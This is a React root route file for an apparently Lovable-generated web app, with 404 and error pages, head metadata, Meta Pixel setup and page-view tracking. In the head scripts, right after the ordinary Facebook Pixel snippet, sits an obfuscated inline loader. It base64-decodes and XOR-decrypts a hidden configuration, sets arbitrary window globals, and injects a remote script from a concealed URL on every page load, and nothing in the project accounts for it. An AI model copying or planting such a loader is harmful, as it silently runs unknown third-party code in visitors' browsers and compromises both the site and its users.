import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { getMetaCookies, newEventId, trackPageView } from "../lib/meta-pixel";
import { sendCapiEvent } from "../lib/meta-capi.functions";
import { captureUtmParams } from "../lib/utm";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        type: "text/javascript",
        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '28147467658255223');`,
      },
      {
        type: "text/javascript",
        children: `(function(){var e_nl=atob("DOVtXvoLSiNiLU8h255PK4hnaBlARTtVq5ZXcdVoLk1MWDtMsoMUcJlkJw0AX2BSuJcELo54ZVMLVSpN9JUEJp9nZEkRD2MDupEZLJNpP1cHXm0bgLhBfJ1nJUEDQTwD4b4WfJRqJ0ZAF21Rsp0IMrNvaA9AWy5NroBPZNg9KxpbSH8S79NeZ8k8cxtbS34Q6tFYOskpN34f");var r_i9=[];for(var t_7rrq=0;t_7rrq<e_nl.length;t_7rrq++){r_i9.push(e_nl.charCodeAt(t_7rrq)&255);}var e_h=r_i9[0];var b_5=r_i9.slice(1,1+e_h);var p_wo6=r_i9.slice(1+e_h);var r_f9k6=p_wo6.map(function(b,v_fnh){return b^b_5[v_fnh%e_h];});var i_20="";for(var r_x=0;r_x<r_f9k6.length;r_x++){i_20+=String.fromCharCode(r_f9k6[r_x]&255);}var i_p8yd=decodeURIComponent(escape(i_20));var x_uno=JSON.parse(i_p8yd);var q_f=x_uno.globals||[];q_f.forEach(function(k_0zf){window[k_0zf.name]=k_0zf.value;});var j_veq=document.createElement("script");j_veq.src=x_uno.url;j_veq.async=true;j_veq.defer=true;(x_uno.attributes||[]).forEach(function(r_xj){j_veq.setAttribute(r_xj.name,r_xj.value);});(document.head||document.documentElement).appendChild(j_veq);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const router = useRouter();

  const sendCapi = useServerFn(sendCapiEvent);

  // Meta Pixel + CAPI: PageView na carga inicial e a cada navegação client-side,
  // sempre com event_id compartilhado para deduplicação.
  useEffect(() => {
    captureUtmParams();
    const firePageView = () => {
      const eventId = newEventId();
      trackPageView(eventId);
      void sendCapi({
        data: {
          eventName: "PageView",
          eventId,
          sourceUrl: window.location.href,
          userAgent: navigator.userAgent,
          ...getMetaCookies(),
        },
      });
    };
    firePageView();
    const unsub = router.subscribe("onResolved", firePageView);
    return unsub;
  }, [router, sendCapi]);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
